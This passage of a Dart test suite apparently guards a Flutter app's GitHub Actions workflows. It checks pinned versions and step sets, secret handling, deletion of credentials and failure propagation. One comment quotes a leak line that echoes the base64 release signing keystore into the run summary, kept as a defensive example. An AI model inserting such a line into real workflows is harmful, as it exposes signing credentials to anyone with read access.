                'workflow\'s, so this is the whole grant that job runs with',
          );
        }
      });
    });

    test('every job that sets up Flutter reads the pinned version', () {
      // #261, and the coverage map's item 10 — "no floating downloads,
      // guarded by a test" — which was true of `uses:` and false of the
      // runtime download it names. Deleting `flutter-version-file: .fvmrc`
      // and floating to `channel: master` left the suite green, so the
      // version the gate actually ran was whatever `master` happened to be
      // that morning.
      var found = 0;
      for (final path in _workflowFiles()) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        for (final job in wf.jobs) {
          for (final step in job.steps) {
            final uses = step.uses;
            if (uses == null || !uses.startsWith('subosito/flutter-action')) {
              continue;
            }
            found++;
            expect(
              step.with_['flutter-version-file'],
              '.fvmrc',
              reason:
                  'flutter-pin: $path job `${job.name}` sets up Flutter '
                  'without reading `.fvmrc`, so the version it builds with '
                  'is whatever the channel holds that day. The pin is the '
                  'only reason a local gate and CI agree',
            );
            expect(
              step.with_['channel'],
              'stable',
              reason:
                  'flutter-pin: $path job `${job.name}` is on channel '
                  '`${step.with_['channel']}`',
            );
          }
        }
      }
      expect(
        found,
        3,
        reason:
            'flutter-pin: expected three Flutter setups (ci.yml\'s two jobs '
            'and release.yml\'s ship); found $found. A new one is unpinned '
            'until it is counted here',
      );
    });

    test('every declared key link is actually wired', () {
      // The scripts with the most thorough tests here are worth nothing if
      // no workflow invokes them — and nothing checked that. `release.yml`
      // could stop calling `ci_version.sh`, and `play-promote.yml` stop
      // calling `play_promote.sh`, with the suite green (#206). Both are
      // declared `key_links` in their stories' Must-haves.
      //
      // What this test does NOT do, said plainly because the comment that
      // stood here said the opposite. It read "Equality, not `contains`:
      // `contains` survives `|| true` and a renamed flag" while the code
      // below was `contains`, so `|| true` on `play_promote.sh` was green,
      // as were a commented-out call, an unreachable branch and a rename to
      // a file that does not exist (#206, #211).
      //
      // Text cannot decide whether a step still DEPENDS on a script; only
      // running it can, and `a step fails when the command it runs fails`
      // does exactly that for every workflow. So this test now asserts the
      // declaration is covered THERE, and the wiring is proven by execution
      // rather than by a substring. The value it keeps is naming the link a
      // story promised, which an exit code cannot do.
      const links = <String, (String, String)>{
        'release.yml → ci_version.sh': (
          '.github/workflows/release.yml',
          'tools/ci_version.sh',
        ),
        'release.yml → check_aab.sh': (
          '.github/workflows/release.yml',
          'tools/check_aab.sh',
        ),
        'release.yml → verify_upload_cert.sh': (
          '.github/workflows/release.yml',
          'tools/verify_upload_cert.sh',
        ),
        'play-promote.yml → play_promote.sh': (
          '.github/workflows/play-promote.yml',
          'tools/play_promote.sh',
        ),
        'ci.yml → gate.sh': ('.github/workflows/ci.yml', 'tools/gate.sh'),
        'ci.yml → mutation_check.py': (
          '.github/workflows/ci.yml',
          'tools/mutation_check.py',
        ),
      };
      links.forEach((name, link) {
        final (workflow, script) = link;
        expect(
          pathExists(script),
          isTrue,
          reason: 'key-link: $script does not exist',
        );
        expect(
          _propagationCommands(workflow),
          contains(script),
          reason:
              'key-link: $name is declared in the story\'s Must-haves, but '
              'no step of $workflow is exercised against $script in `a step '
              'fails when the command it runs fails`. Until it is, nothing '
              'proves the workflow still depends on it — every refusal that '
              'script makes is dead code if nothing calls it',
        );
      });
    });

    test('every workflow pins its step set', () {
      // `ship`'s 18 ids were pinned for #182; `play-promote.yml` was not, so
      // a NEW step there could publish #130's literal string on every
      // failure path with the suite green (#209).
      //
      // The first version of this test said it was "derived from the files
      // rather than named per-file" and was a two-entry literal covering two
      // of the four workflows. That comment was false, and what it hid was
      // `release.yml`'s `report-gate-failure`: a job whose NAME was pinned,
      // whose steps were pinned nowhere, which runs on every failed gate and
      // can read every workflow-level secret. A step there that base64'd the
      // signing keystore into the run summary passed the whole suite.
      //
      // So the enumeration is now closed against the directory: every file
      // `_workflowFiles()` finds, and every job in it, must appear below.
      // A new workflow, or a new job in an existing one, fails this test
      // until someone writes down what its steps are. That is the property
      // the old comment claimed and the old code did not have.
      const expected = <String, Map<String, List<String>>>{
        '.github/workflows/play-promote.yml': {
          'promote': [
            'refuse',
            'checkout',
            'token',
            'promote',
            'summary',
            'forget',
          ],
        },
        '.github/workflows/play-api-check.yml': {
          'check': ['checkout', 'java', 'play', 'keystore', 'forget'],
        },
        '.github/workflows/release.yml': {
          'gate': <String>[],
          'ship': [
            'checkout',
            'secrets_present',
            'version',
            'java',
            'flutter',
            'deps',
            'keystore',
            'keystore_check',
            'build',
            'scan',
            'cert',
            'sidecar',
            'artifact',
            'asset',
            'play',
            'summary',
            'name_failure',
            'shred',
          ],
          'report-gate-failure': ['say'],
        },
        '.github/workflows/ci.yml': {
          'gate': [
            'checkout',
            'shellcheck',
            'java',
            'flutter',
            'deps',
            'guards',
            'gate',
            'artifact',
          ],
          'mutations': ['checkout', 'java', 'flutter', 'deps', 'mutations'],
        },
      };

      expect(
        expected.keys.toSet(),
        _workflowFiles().toSet(),
        reason:
            'step-set: a workflow file is not pinned here. Every file in '
            '$_workflowDir must have its jobs and steps written down — an '
            'unpinned file is a place a step can be added silently, which '
            'is #209',
      );

      expected.forEach((path, jobs) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        expect(
          wf.jobs.map((j) => j.name).toList(),
          jobs.keys.toList(),
          reason: 'step-set: $path has jobs other than ${jobs.keys}',
        );
        jobs.forEach((job, ids) {
          expect(
            wf.job(job)!.steps.map((s) => s.id).toList(),
            ids,
            reason:
                'step-set: exactly these steps in this order in '
                '$path job `$job` — an inserted step runs with whatever '
                'that job holds, which here is ${_jobHolds(path, job)}',
          );
        });
      });
    });

    test('a step that states something states the truth', () {
      // #226. Nine steps are declared `[]` in `_dependsOn` — they run no
      // command the propagation check stubs, so it never runs them; the
      // definition is on `_dependsOn`. #216 covered the three that destroy a
      // credential and `secrets_present` has its own test below. The rest
      // make a CLAIM in a run summary or a log, and each could be replaced
      // by an `echo` of the opposite with the suite green — `summary` and
      // `name_failure` still could at round eleven. play-promote's `refuse`
      // is also exercised by `play_promote_args_test.dart`, which runs its
      // body and asserts the exit codes; what was missing here is the same
      // question asked of what it SAYS. Its `summary` was run by nothing.
      //
      // `say` is the sharpest: on a failed gate it is the only thing that
      // says nothing shipped, and it could say the reverse.
      //
      // Each case runs the real body and asserts what it WROTE — the same
      // question #215 and #224 ask, pointed at honesty rather than secrecy.
      // The cases live in `_claims`, top level, because `every [] step is
      // exercised by a named test` holds that map to the `[]` set.
      _claims.forEach((what, spec) {
        final wf = Workflow.parse(spec.path, readFile(spec.path));
        expect(wf.problem, isNull, reason: '${spec.path}: ${wf.problem}');
        final step = wf
            .job(spec.job)!
            .steps
            .firstWhere(
              (s) => s.id == spec.step,
              orElse: () => fail(
                'honesty: ${spec.path} job `${spec.job}` has no step '
                '`${spec.step}` — the step that says "$what" is gone',
              ),
            );

        final r = _runStepBody(
          step.run!,
          ambient: _ambientCommands,
          extraEnv: spec.env,
          expressions: spec.expressions,
          plant: spec.plant,
        );

        // The positive control. A body that cannot run says nothing, and
        // "it did not say the wrong thing" would then be true of silence —
        // which is how #224 and #225 were vacuous (#226). For a step whose
        // job on this input is to refuse, completing IS the wrong thing.
        expect(
          r.code,
          spec.completes ? 0 : isNot(0),
          reason: spec.completes
              ? 'honesty: ${spec.path} job `${spec.job}` step `${spec.step}` '
                    'did not complete, so what it says was never observed. '
                    'stderr: ${r.err}'
              : 'honesty: ${spec.path} job `${spec.job}` step `${spec.step}` '
                    'completed on an input it exists to refuse. $what',
        );

        // stderr included: a refusal explains itself there.
        final said = '${r.out}\n${r.err}\n${r.wrote}';
        for (final phrase in spec.mustSay) {
          expect(
            said,
            contains(phrase),
            reason: 'honesty: `${spec.step}` no longer says "$phrase". $what',
          );
        }
        for (final phrase in spec.mustNotSay) {
          expect(
            said,
            isNot(contains(phrase)),
            reason:
                'honesty: `${spec.step}` says "$phrase", which is not true '
                'on the path it runs on. $what',
          );
        }
      });
    });

    test('every [] step is exercised by a named test', () {
      // #226's "better still". Declaring a step `[]` in `_dependsOn` takes
      // it out of the propagation check, and for the steps declared `[]`
      // that was the end of the story until #216 and #226. No count is
      // written here: the assertion below is over the sets themselves, and a
      // number in a comment is one more thing to keep true by hand. The rationale for `[]`
      // used to live in three comments that disagreed (#233); it lives on
      // `_dependsOn` now, and this is the part of it that executes: the
      // `[]` steps and the steps some test runs must be the SAME set. A `[]`
      // step nothing names is uncovered; a named step that is not `[]` is a
      // spec that has drifted from the map.
      final exempt = <String>{
        for (final wf in _dependsOn.entries)
          for (final job in wf.value.entries)
            for (final step in job.value.entries)
              if (step.value.isEmpty) '${wf.key} ${job.key} ${step.key}',
      };
      final covered = <String>{
        for (final c in _claims.values) '${c.path} ${c.job} ${c.step}',
        for (final d in _destroys.entries)
          '${d.key} ${d.value.job} ${d.value.step}',
        '${_preflight.path} ${_preflight.job} ${_preflight.step}',
      };
      expect(
        covered,
        unorderedEquals(exempt),
        reason:
            'coverage: the `[]` steps of `_dependsOn` and the steps the '
            'honesty, destroys and pre-flight tests run are not the same '
            'set. A `[]` step no test names is exercised by nothing — the '
            'state #216 found seven steps in and #226 found four',
      );
    });

    test('the secrets pre-flight refuses a missing secret', () {
      // The other half of `secrets_present`: it is `[]` because it runs no
      // command the propagation check could stub — the check is five
      // `[ -z ]` tests — so nothing exercised it, and nothing asserted it
      // can fail. Gutted to `echo "all five secrets are present"` it was
      // green — a step named "Assert every secret is present" announcing a
      // check it no longer performs (#204's bullet at round eight, #216's at
      // round nine, still true at round ten).
      final wf = Workflow.parse(_preflight.path, readFile(_preflight.path));
      final body = wf.job(_preflight.job)!.stepById(_preflight.step)!.run!;

      const names = [
        'PLAY_SERVICE_ACCOUNT_JSON',
        'HS_KEYSTORE_B64',
        'HS_KEYSTORE_PASS',
        'HS_KEY_ALIAS',
        'HS_KEY_PASS',
      ];
      final present = {for (final n in names) n: 'present-$n'};

      // Positive control first: with all five set it must SUCCEED, or the
      // refusals below are indistinguishable from a body that always fails.
      final ok = _runStepBody(
        body,
        ambient: _ambientCommands,
        extraEnv: present,
      );
      expect(
        ok.code,
        0,
        reason:
            'secrets-preflight: the step fails even with every secret set, '
            'so the refusals below prove nothing. stderr: ${ok.err}',
      );

      // And one at a time, each must be refused BY NAME.
      for (final missing in names) {
        final env = {...present, missing: ''};
        final r = _runStepBody(body, ambient: _ambientCommands, extraEnv: env);
        expect(
          r.code,
          isNot(0),
          reason:
              'secrets-preflight: `$missing` is empty and the step reported '
              'SUCCESS. The release would build and fail later, or ship '
              'unsigned',
        );
        expect(
          '${r.out}${r.err}',
          contains(missing),
          reason:
              'secrets-preflight: the refusal does not name `$missing`, so '
              'whoever reads the log cannot tell which secret is missing',
        );
      }
    });

    test('every step that promises to destroy a credential destroys it', () {
      // #216. Nine steps were declared `[]` in `_dependsOn` — they run no
      // command the propagation check stubs — and a `[]` step is never run
      // by that check, so seven of them were exercised by nothing. Three of
      // those exist solely to destroy a credential, and each could be
      // replaced by `echo` with the whole suite green:
      //
      //   release.yml      ship    shred   -> the decoded signing keystore
      //   play-promote.yml promote forget  -> the service-account key
      //   play-api-check   check   forget  -> the key AND the keystore
      //
      // Declaring a step exempt from the propagation check is reasonable —
      // its failure genuinely should not stop the job. What was missing is
      // the other half: saying what DOES cover it. This is that half, and it
      // asks the only question that matters for a step named "remove": run
      // it, then look for the file. The map is `_destroys`, top level, so the
      // closure test can hold it to the `[]` set.
      _destroys.forEach((path, spec) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        final step = wf
            .job(spec.job)!
            .steps
            .firstWhere(
              (s) => s.id == spec.step,
              orElse: () => fail(
                'destroys: $path job `${spec.job}` has no step `${spec.step}` — '
                'the step that removes ${spec.files.join(' and ')} is gone',
              ),
            );

        // THE POSITIVE CONTROL, and this test needed it twice over.
        //
        // Round eight learned that a test which cannot pass is as useless as
        // one that cannot fail, added `expect(clean.code, 0)` to the
        // propagation check, and wrote that up as the transferable lesson.
        // This test was written two passes later with no control at all and
        // was vacuous for `play-sa.json` from the day it shipped (#224).
        //
        // So the precondition is asserted rather than assumed: each file must
        // EXIST before the body runs. If a future harness change stops
        // planting one, this fails loudly instead of passing for nothing.
        final r = _runStepBody(
          step.run!,
          ambient: _ambientCommands,
          keepWorkspace: true,
          beforeRun: (workspace) {
            for (final name in spec.files) {
              expect(
                File('${workspace.path}/runner/$name').existsSync(),
                isTrue,
                reason:
                    'destroys: precondition — `$name` must exist before '
                    '$path job `${spec.job}` step `${spec.step}` runs, or '
                    '"it is gone afterwards" asserts nothing. Add it to '
                    '`_runnerCredentials`',
              );
            }
          },
        );
        try {
          for (final name in spec.files) {
            final left = File('${r.workspace.path}/runner/$name');
            expect(
              left.existsSync(),
              isFalse,
              reason:
                  'destroys: $path job `${spec.job}` step `${spec.step}` ran '
                  'and `$name` is still in \$RUNNER_TEMP. The credential '
                  'survives the job — on a hosted runner that is the end of '
                  'it, but the step promises otherwise and nothing else '
                  'checks',
            );
          }
        } finally {
          r.workspace.deleteSync(recursive: true);
        }
      });
    });

    test('no step publishes a secret it was handed', () {
      // #215. Pinning a step set fixes WHICH steps exist; it says nothing
      // about what they do. At 933cfad a single line appended to the
      // already-pinned `keystore` step —
      //
      //     echo "$HS_KEYSTORE_B64" >> "$GITHUB_STEP_SUMMARY"
      //
      // put the base64 of the release signing keystore into a rendered,
      // retained, downloadable run summary, and the whole suite was green.
      // Three guards each declined for a different reason: the step set was
      // unchanged; the textual secret rule only refuses `${{ secrets.* }}`
      // INSIDE a `run:` body, and this secret arrives through `env:`; and
      // the propagation harness reads exit codes, never output.
      //
      // So the question is asked of bash, the way #205 asks every other
      // runtime question: bind each secret the step declares to a value
      // nothing else could produce, run the body, and look at everything it
      // wrote.
      //
      // Scope, stated because the name is broader than the rule: this covers
      // a secret the step is HANDED, through workflow-, job- or step-level
      // `env:`. A step with no `env:` cannot leak one this way — `forget` in
      // play-promote.yml is the example, and a body of `echo
      // "$PLAY_SERVICE_ACCOUNT_JSON"` there expands to nothing. What it does
      // NOT cover is a step reading a secret back off DISK that an earlier
      // step wrote, such as `$RUNNER_TEMP/play-sa.json`. `forget` removing
      // that file is asserted separately (#216); a step publishing its
      // contents is not covered here.
      for (final path in _workflowFiles()) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        for (final job in wf.jobs) {
          for (final step in job.steps) {
            final body = step.run;
            if (body == null) continue;

            // The secrets THIS step is given, workflow- and job-level env
            // included — a value in scope is a value the body can echo.
            final secretEnv = <String, String>{};
            var n = 0;
            for (final env in [wf.env, job.env, step.env]) {
              env.forEach((name, value) {
                if (!RegExp(r'\$\{\{\s*secrets\.').hasMatch(value)) return;
                // The keystore ALIAS is stored as a secret and is public by
                // design: it is in `android/signing/README.md`, on keytool's
                // command line, and the play-api-check summary reports it on
                // purpose. `secrets_scripts_test.dart` already excludes it
                // from sentinel derivation for the same reason; the two must
                // agree or one of them is wrong.
                // Exempt by the SECRET, not by the env name.
                //
                // `endsWith('ALIAS')` keyed on the left-hand side, so any env
                // key spelled `*ALIAS` was exempt whatever it held —
                // `HS_KEYSTORE_ALIAS: ${{ secrets.HS_KEYSTORE_PASS }}` plus a
                // leak of it was green (#225). The keystore alias really is
                // public (it is in the signing README, on keytool's command
                // line, and play-api-check reports it on purpose); the
                // password is not, and only the right-hand side says which
                // is which.
                final secret = RegExp(r'secrets\.(\w+)')
                    .firstMatch(value)!
                    .group(1)!;
                if (_publicSecrets.contains(secret)) return;
                // Base64 alphabet, length a multiple of four: `keystore`
                // runs its value through a REAL `base64 -d` now (#232), and
                // a value it rejects fails the step before the line that
                // would leak — the control below would be red for a reason
                // that is not a leak.
                secretEnv[name] = _sentinel('${n++}');
              });
            }
            if (secretEnv.isEmpty) continue;

            // TWO passes, and the second is the positive control.
            //
            // With one distinct sentinel per secret, a body that begins
            // `if [ "$HS_KEY_PASS" != "$HS_KEYSTORE_PASS" ]; then … exit 1`
            // — which `keystore_check` and play-api-check's `keystore` both
            // do — exits at that line and everything after it is
            // unreachable. The leak went green not because it was absent but
            // because the body never reached it (#225).
            //
            // So: one pass with distinct values, to catch a step that echoes
            // a particular secret; one with a SHARED value, so equality
            // checks pass and the rest of the body actually runs. And
            // `expect(code, 0)` on the shared pass, because a body that
            // cannot complete proves nothing — the same control #224 needed.
            final shared = _sentinel('SHARED');
            final sharedEnv = {for (final name in secretEnv.keys) name: shared};

            final distinct = _runStepBody(
              body,
              ambient: _ambientCommands,
              extraEnv: secretEnv,
            );
            final same = _runStepBody(
              body,
              ambient: _ambientCommands,
              extraEnv: sharedEnv,
            );
            expect(
              same.code,
              0,
              reason:
                  'published-secret: $path job `${job.name}` step '
                  '`${step.id}` cannot complete even with every secret equal '
                  'and every command succeeding, so the search below covers '
                  'only the lines it reached. stderr: ${same.err}',
            );

            // Every form the value could take, not the literal only. `rev`
            // and `base64` are ordinary commands and a reader of the summary
            // reverses either instantly; searching verbatim let both through
            // (#225).
            final hunted = <String, String>{
              for (final entry in secretEnv.entries)
                for (final form in _leakShapes(entry.value)) form: entry.key,
              for (final form in _leakShapes(shared)) form: 'a shared secret',
            };

            for (final entry in hunted.entries) {
              for (final channel in <(String, String)>[
                ('stdout', '${distinct.out}\n${same.out}'),
                ('stderr', '${distinct.err}\n${same.err}'),
                (
                  'a file it wrote (the run summary is one)',
                  '${distinct.wrote}\n${same.wrote}',
                ),
              ]) {
                expect(
                  channel.$2,
                  isNot(contains(entry.key)),
                  reason:
                      'published-secret: $path job `${job.name}` step '
                      '`${step.id}` writes the value of `${entry.value}` to '
                      '${channel.$1}. A step set pins which steps exist, not '
                      r'what they do — and `$GITHUB_STEP_SUMMARY` is '
                      'rendered, '
                      'retained and downloadable by anyone with read access',
                );
              }
            }
          }
        }
      }
    });

    test('a step fails when the command it runs fails', () {
      // #205's principle, applied to every workflow rather than one job.
      //
      // `_swallowsFailure` was a per-line regex asked to answer a
      // shell-semantics question, and it lost to a `#` inside a quoted
      // string, a trailing `&`, `|| echo`, `$( || true )`, `set +o errexit`,
      // and any command outside an eight-item allow-list (#197, #204). Every
      // one of those is ORDINARY SHELL, and bash decides shell questions
      // correctly by construction.
      //
      // Round eight then found the fix had the SAME blast radius as the
      // thing it replaced: it looped `release.yml`'s `ship` job alone, so 9
      // of the repository's 27 run-bodied steps were exercised and `|| true`
      // on `tools/play_promote.sh` — the one key link nothing else covers —
      // was green (#204, #206). A second mechanism with the same scope is
      // not a fix, so the loop is now over every workflow file.
      //
      // This also subsumes the key-link question. A `key-link` test that
      // asks whether a step's text CONTAINS a script name says yes to a
      // commented-out call, an unreachable branch, a renamed file and
      // `|| true`. Running the step with that script failing answers the
      // question that was actually being asked: does this step still depend
      // on that script.

      // The map is closed against the files: every run-bodied step in every
      // workflow must be named. A step that runs no stubbable command is
      // named with an empty list, so leaving one out is a deliberate act
      // rather than an omission nobody sees — and `every [] step is
      // exercised by a named test` then demands the test that covers it.
      final actual = <String>{};
      for (final path in _workflowFiles()) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        for (final job in wf.jobs) {
          for (final step in job.steps) {
            if (step.run != null) actual.add('$path ${job.name} ${step.id}');
          }
        }
      }
      final declared = <String>{
        for (final path in _dependsOn.keys)
          for (final job in _dependsOn[path]!.keys)
            for (final id in _dependsOn[path]![job]!.keys) '$path $job $id',
      };
      expect(
        declared,
        actual,
        reason:
            'propagation: a step with a `run:` body is not listed in '
            'dependsOn. Say which command it depends on, or say none',
      );

      final ambient = _ambientCommands;

      _dependsOn.forEach((path, jobs) {
        final wf = Workflow.parse(path, readFile(path));
        jobs.forEach((job, steps) {
          steps.forEach((id, commands) {
            final step = wf.job(job)!.steps.firstWhere((s) => s.id == id);
            final body = step.run!;
            for (final command in commands) {
              // BOTH directions, and the second is the one #204 was missing.
              //
              // Asking only "does it fail when the command fails" is
              // satisfied by a body that fails NO MATTER WHAT, and four of
              // the nine steps then covered did exactly that: `build`
              // because `${{ … }}` is a bash bad substitution that aborts
              // before `flutter` is reached, `sidecar` and `keystore`
              // because the harness lacked files they open, and `asset`
              // because `sha256sum` is absent on macOS. `isNot(0)` held
              // unconditionally, so the assertion proved nothing about them.
              //
              // A test that cannot pass is as useless as one that cannot
              // fail, so the same body is also run with everything
              // succeeding and must then SUCCEED.
              final failed = _runStepBody(
                body,
                ambient: ambient,
                failing: command,
              );
              expect(
                failed.code,
                isNot(0),
                reason:
                    'propagation: $path job `$job` step `$id` reported '
                    'SUCCESS while `$command` exited 1. Its failure does not '
                    'reach the step, so the step guarantees nothing — and if '
                    '`$command` is a project script, nothing now proves the '
                    'step still runs it. stdout: ${failed.out}',
              );

              final clean = _runStepBody(body, ambient: ambient);
              expect(
                clean.code,
                0,
                reason:
                    'vacuity: $path job `$job` step `$id` fails even when '
                    '`$command` SUCCEEDS, so the propagation check above it '
                    'is satisfied unconditionally and proves nothing. Fix '
                    'the harness until this step can pass, or the assertion '
                    'is theatre. stderr: ${clean.err}',
              );
            }
          });
        });
      });
    });

    test('every rule reports a document it cannot read, and never throws', () {
      // #203, answered by running the rules instead of reading them.
      //
      // The chain is five long: #177 the error handling was missing; #191 no
      // test reached it; #194 the test reached it through a bypassable seam;
      // #203 the call sites could route around it; and at round eight the
      // text assertion written for #203 was itself defeated three ways —
      // repoint five of six call sites and leave one `Workflow.parse(` and
      // the set equality is satisfied; put the required spelling in a
      // COMMENT and no real call site is needed at all; or reach a second
      // parse path through an extension, a helper in a third file, or a
      // tear-off, none of which spell `Workflow.`.
      //
      // Every one of those defeats a rule ABOUT the source, and none of them
      // survives running the rules: the property is a runtime one. Whatever
      // a rule calls internally, a document it cannot read must come back as
      // an offender rather than as an exception that takes the suite with it.
      //
      // Scope: the errors a loader RETURNS on bad input — every row below
      // raises a `YamlException` or parses to the wrong type. The `Error`
      // path, a real stack overflow in the loader, is the next test's.
      const rules = <String, List<WorkflowOffender> Function(String, String)>{
        'unpinnedUses': unpinnedUses,
        'permissionOffenders': permissionOffenders,
        'concurrencyOffenders': concurrencyOffenders,
        'secretsInRunOffenders': secretsInRunOffenders,
        'untrustedInRunOffenders': untrustedInRunOffenders,
        'shellTraceOffenders': shellTraceOffenders,
      };

      const unreadable = <String, String>{
        'unclosed flow sequence': 'jobs: [a, b',
        'a tab where YAML forbids one': 'jobs:\n\tbuild: {}',
        'duplicate mapping key': 'on: push\non: pull_request\n',
        'not a mapping at all': '- just\n- a\n- list\n',
        'a bare scalar': 'nonsense',
        'an alias to nothing': 'jobs: *missing\n',
      };
      // Two of these — `not a mapping at all` and `a bare scalar` — are VALID
      // YAML. They exercise the `doc is! YamlMap` branch, which is ordinary
      // control flow, not error handling. Said plainly because the test's name
      // covers them and its purpose does not (#217).

      for (final rule in rules.entries) {
        unreadable.forEach((what, text) {
          late final List<WorkflowOffender> offenders;
          expect(
            () => offenders = rule.value('.github/workflows/bad.yml', text),
            returnsNormally,
            reason:
                'parse-path: rule `${rule.key}` THREW on $what instead of '
                'reporting it. A workflow nobody can parse is a workflow '
                'nobody is checking, and the exception takes the whole suite '
                'with it — #177, reachable again through whatever parse path '
                'this rule uses',
          );
          expect(
            offenders,
            isNotEmpty,
            reason:
                'parse-path: rule `${rule.key}` returned NO offender for $what. '
                'Silence and "this file is fine" are the same answer to the '
                'caller, which is how an unparseable workflow passes a gate',
          );
        });
      }
    });

    test('every rule reports a document that overflows the loader', () async {
      // #217, the sixth defeat of #177: a second parse path that catches
      // `YamlException` but not `Error` passed the previous test, because
      // none of its documents raises an `Error`. Only a real stack overflow
      // in the recursive loader does — alias recursion and billion-laughs
      // both raise `YamlException`; measured on the issue.
      //
      // A real overflow was unshippable for a round because the depth that
      // produces one is a property of the stack the parse runs on, and the
      // MAIN isolate's stack differs between machines and settings — which
      // is why a fixed depth passed here and parsed cleanly on the runner.
      //
      // A WORKER isolate's does not: `Isolate.run` overflows the loader at a
      // far smaller depth, and at the same one under every stack limit tried.
      // So every parse here runs in a worker, the depth is found by doubling
      // until `Workflow.parse` itself reports the overflow — asserting it
      // happened, which is the one thing the reverted row got right — and
      // each rule then meets a document twice that deep.
      //
      // The measurements behind that paragraph, including the `ulimit -s`
      // one that was quoted here wrongly, are on #217 and #239 with the date
      // and the command that produced them. None of them is asserted; what
      // is asserted is below, and it needs no number: some depth under the
      // cap overflows, and every rule reports it.
      String deep(int n) => 'jobs: ${'[' * n}${']' * n}\n';
      const cap = 1 << 16;

      late final int depth;
      try {
        depth = await Isolate.run(() {
          for (var n = 1000; n <= cap; n *= 2) {
            final problem = Workflow.parse('deep.yml', deep(n)).problem;
            if (problem != null && problem.contains('too deep')) return n;
          }
          return -1;
        });
      } on Object catch (e) {
        fail(
          'overflow: `Workflow.parse` THREW ${e.runtimeType} on a document '
          'that overflows the loader, instead of reporting it. The '
          '`StackOverflowError` handler #177 added is gone or unreached',
        );
      }
      expect(
        depth,
        isNot(-1),
        reason:
            'overflow: no depth up to $cap overflowed the loader in a worker '
            'isolate, so nothing below exercises the Error path. The worker '
            'stack has grown; raise the cap',
      );

      const rules = <String, List<WorkflowOffender> Function(String, String)>{
        'unpinnedUses': unpinnedUses,
        'permissionOffenders': permissionOffenders,
        'concurrencyOffenders': concurrencyOffenders,
        'secretsInRunOffenders': secretsInRunOffenders,
        'untrustedInRunOffenders': untrustedInRunOffenders,
        'shellTraceOffenders': shellTraceOffenders,
      };
      final text = deep(depth * 2);
      for (final rule in rules.entries) {
        late final List<WorkflowOffender> offenders;
        try {
          offenders = await Isolate.run(() => rule.value('deep.yml', text));
        } on Object catch (e) {
          fail(
            'overflow: rule `${rule.key}` THREW ${e.runtimeType} on a '
            'document ${depth * 2} levels deep instead of reporting it. A '
            'parse path that catches YamlException and not Error is #177 '
            'again, reachable through whatever this rule calls — and it '
            'takes the whole suite with it (#217)',
          );
        }
        expect(
          offenders.map((o) => o.message).join('\n'),
          contains('too deep'),
          reason:
              'overflow: rule `${rule.key}` did not report the overflow as '
              'the offender it is designed to be; it returned $offenders',
        );
      }
    }, timeout: const Timeout(Duration(minutes: 2)));

    test('the rules parse through Workflow.parse and nothing else', () {
      // #203: `parse` and `parseWithLoader` were collapsed into one body so
      // there would be "no second body to rewrite". A NEW one can still be
      // added and the rules repointed at it — I did exactly that and the
      // suite stayed green with `dart analyze` clean.
      //
      // The chain: #177 the handler was missing; #191 no test reached it;
      // #194 the test reached it through a bypassable seam; #203 the call
      // sites route around it. The link that has never been asserted is
      // WHICH FUNCTION THE RULES CALL, so that is what this asserts.
      final rules = readFile('test/guards/workflow_rules.dart');
      expect(
        rules,
        isNot(contains('loadYaml')),
        reason:
            'parse-path: workflow_rules.dart loads YAML itself, bypassing '
            'the error handling in Workflow.parse',
      );
      final entryPoints = RegExp(r'Workflow\.(\w+)\(')
          .allMatches(rules)
          .map((m) => m.group(1))
          .toSet();
      expect(
        entryPoints,
        {'parse'},
        reason:
            'parse-path: the rules reach Workflow through $entryPoints. '
            'Only `parse` carries the StackOverflowError handling, so any '
            'other entry point is #177 back on the production path',
      );
      // And nothing may pass a loader: the default is the real one.
      // Anchored: a bare `load:` also matches the word `payload:` in a
      // comment, which is how this test first failed on its own prose.
      expect(
        RegExp(r'[\s(,]load:\s').hasMatch(rules),
        isFalse,
        reason:
            'parse-path: a rule passes its own loader, so the handler it '
            'relies on is whatever that loader does',
      );
    });

    test('dependabot watches both ecosystems', () {
      final offenders = dependabotOffenders(
        pathExists('.github/dependabot.yml')
            ? readFile('.github/dependabot.yml')
            : null,
      );
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('dependabot', offenders),
      );
    });
    test('the .fvmrc pin satisfies the pubspec range', () {
      final offenders = flutterPinOffenders(
        readFile('.fvmrc'),
        readFile('pubspec.yaml'),
      );
      expect(
        offenders,
        isEmpty,
        reason: describeOffenders('flutter-pin', offenders),
      );
    });
  });
}
